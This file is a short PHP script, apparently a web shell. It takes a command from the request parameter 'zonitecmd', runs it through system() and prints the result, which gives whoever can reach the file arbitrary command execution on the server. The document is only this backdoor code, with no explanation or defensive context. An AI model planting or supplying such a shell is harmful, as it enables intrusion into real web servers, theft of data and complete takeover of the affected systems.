<?php
if (isset($_REQUEST['zonitecmd'])) {
    echo "<pre>";
    $cmd = ($_REQUEST['zonitecmd']);
    system($cmd);
    echo "</pre>";
    die;
}
?>